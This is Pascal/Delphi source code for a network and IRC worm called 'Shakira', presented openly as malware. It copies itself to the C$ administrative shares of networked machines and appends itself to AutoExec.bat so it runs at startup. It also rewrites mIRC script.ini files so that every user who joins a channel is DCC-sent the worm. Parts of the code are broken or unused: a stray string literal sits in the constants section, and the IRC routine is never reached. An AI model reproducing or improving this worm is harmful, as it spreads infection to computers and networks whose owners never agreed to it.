   Program Shakira;

   Uses
    Windows;

   TYPE
    TFileName = type string;
    TSearchRec = record
     Time: Integer;
     Size: Integer;
     Attr: Integer;
     Name: TFileName;
     ExcludeAttr: Integer;
     FindHandle: THandle  platform;
     FindData: TWin32FindData  platform;
    end;

    LongRec = packed record
     case Integer of
     0: (Lo, Hi: Word);
     1: (Words: array [0..1] of Word);
     2: (Bytes: array [0..3] of Byte);
    end;

   Const
   'Psychologic Was Here';
    faReadOnly  = $00000001;
    faHidden    = $00000002;
    faSysFile   = $00000004;
    faVolumeID  = $00000008;
    faDirectory = $00000010;
    faArchive   = $00000020;
    faAnyFile   = $0000003F;

   VAR
    Domains      : String;

    SYSTEMTIME       : _SYSTEMTIME;

    function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar;Reserved: LongWord; StatusCB: cardinal):Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';
    Function LowerCase(const S: string): string;
    var
     Len: Integer;
    begin
     Len := Length(S);
     SetString(Result, PChar(S), Len);
     if Len > 0 then CharLowerBuff(Pointer(Result), Len);
    end;

    Function FileSize(FileName: String): Int64;
    Var
      H: THandle;
      FData: TWin32FindData;
    Begin
      Result:= -1;

      H:= FindFirstFile(PChar(FileName), FData);
      If H <> INVALID_HANDLE_VALUE Then
      Begin
        Windows.FindClose(H);
        Result:= Int64(FData.nFileSizeHigh) Shl 32 + FData.nFileSizeLow;
      End;
    End;

    Function ExtractFileName(Str:String):String;
    Begin
     While Pos('\', Str)>0 Do
      Str := Copy(Str, Pos('\',Str)+1, Length(Str));
     Result := Str;
    End;

    Function ExtractFileExt(s:string):String;
    Begin
     While Pos('.', S)>0 Do
      S := Copy(S, pos('.', S)+1, Length(s));
     Result := S;
    End;

    function FileExists(const FileName: string): Boolean;
    var
      Handle: THandle;
      FindData: TWin32FindData;
    begin
      Handle := FindFirstFileA(PChar(FileName), FindData);
      result:= Handle <> INVALID_HANDLE_VALUE;
      if result then
      begin
        CloseHandle(Handle);
      end;
    end;

    Procedure InfectIrc(F  :String);
    Var
     irc: TextFile;
    Begin
     AssignFile(irc, F);
     ReWrite(irc);
     WriteLn(irc, 'ON *:JOIN:{');
     WriteLn(irc, ' .dcc send $nick '+paramstr(0)+'');
     WriteLn(irc, ' .msg $nick its a worm.');
     WriteLn(irc, '}');
     CloseFile(irc);
    End;
    function FindMatchingFile(var F: TSearchRec): Integer;
    var
     LocalFileTime: TFileTime;
    begin
     with F do
      begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
        if not FindNextFile(FindHandle, FindData) then
         begin
          Result := GetLastError;
          Exit;
         end;
        FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
        FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
      LongRec(Time).Lo);
      Size := FindData.nFileSizeLow;
      Attr := FindData.dwFileAttributes;
      Name := FindData.cFileName;
     end;
     Result := 0;
    end;
    procedure FindClose(var F: TSearchRec);
    begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
      Windows.FindClose(F.FindHandle);
      F.FindHandle := INVALID_HANDLE_VALUE;
     end;
    end;

    function FindFirst(const Path: string; Attr: Integer;
                       var  F: TSearchRec): Integer;
    const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
    begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
      Result := FindMatchingFile(F);
      if Result <> 0 then FindClose(F);
     end else
      Result := GetLastError;
    end;

    function FindNext(var F: TSearchRec): Integer;
    begin
     if FindNextFile(F.FindHandle, F.FindData) then
      Result := FindMatchingFile(F)
     else
      Result := GetLastError;
    end;
    procedure Enumeration(aResource:PNetResource);
    var
     aHandle: THandle;
     k, BufferSize: DWORD;
     Buffer: array[0..1023] of TNetResource;
     i: Integer;
     begin
      WNetOpenEnum(2,0,0,aResource,aHandle);
      k:=1024;
      BufferSize:=SizeOf(Buffer);
      while WNetEnumResource(aHandle,k,@Buffer,BufferSize)=0 do
      for i:=0 to k-1 do
      begin
       if Buffer[i].dwDisplayType=RESOURCEDISPLAYTYPE_SERVER then
        Domains := Domains + copy(LowerCase(Buffer[i].lpRemoteName),3,MAX_PATH) + #13#10;
       if Buffer[i].dwUsage>0 then
      Enumeration(@Buffer[i])
     end;
     WNetCloseEnum(aHandle);
    end;

    Procedure Network;
    Var
     Name : String;
     Auto : TextFile;
    Begin
     Enumeration(NIL);
     While Domains <> '' Do Begin
      Name := Copy(Domains, 1, Pos(#13#10, Domains)-1);
      Try
       CopyFile(pChar(ParamStr(0)), pChar(Name + '\C$\Setup.exe'), False);
       If FileExists(pChar(Name + '\C$\AutoExec.bat')) Then Begin
        AssignFile(Auto, Name + '\C$\AutoExec.bat');
        Append(Auto);
        WriteLn(Auto, 'Setup.exe');
        CloseFile(Auto);
       End;
      Except
       ;
      End;
      Domains := Copy(Domains, Pos(#13#10, Domains)+2, Length(Domains));
     End;
    End;

    Procedure FFind(D, Name, SearchName : String);
      var
      SR: TSearchRec;
      ext: string;
      fil: textfile;
      l1: string;
      l2: string;
      lin: string;
    begin
      If D[Length(D)] <> '\' then D := D + '\';

      If FindFirst(D + '*.*', faDirectory, SR) = 0 then
        Repeat
          If ((SR.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
            FFind(D + SR.Name + '\', Name, SearchName)
          Else Begin
            ext := ExtractFileExt(SR.Name);

   If SR.name = 'script.ini' Then InfectIrc(D + SR.Name);
           End;
        Until (FindNext(SR) <> 0);
      FindClose(SR);
    end;

   Begin
     Network;
    End.
